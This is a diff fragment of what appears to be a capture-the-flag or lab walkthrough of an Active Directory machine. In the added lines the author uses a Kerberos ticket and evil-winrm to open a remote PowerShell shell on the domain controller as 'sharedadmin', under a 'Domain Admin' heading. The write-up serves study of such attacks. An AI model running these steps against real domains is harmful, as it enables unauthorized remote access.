@@ -692,7 +692,26 @@ SMB         dc01.fragments.local 445    DC01             [+] fragments.local\sha
 export KRB5_CONFIG=/etc/krb5.conf
 ```
 
-Now ive generated it and ex
+Now ive generated it and exported it i can login to evil-winrm
+
+## Domain Admin
+
+```python
+evil-winrm -i dc01.fragments.local -u sharedadmin -r fragments.local                         
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Warning: User is not needed for Kerberos auth. Ticket will be used
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\sharedadmin\Documents>
+```
+
+Now i have access i can a
 
 
 
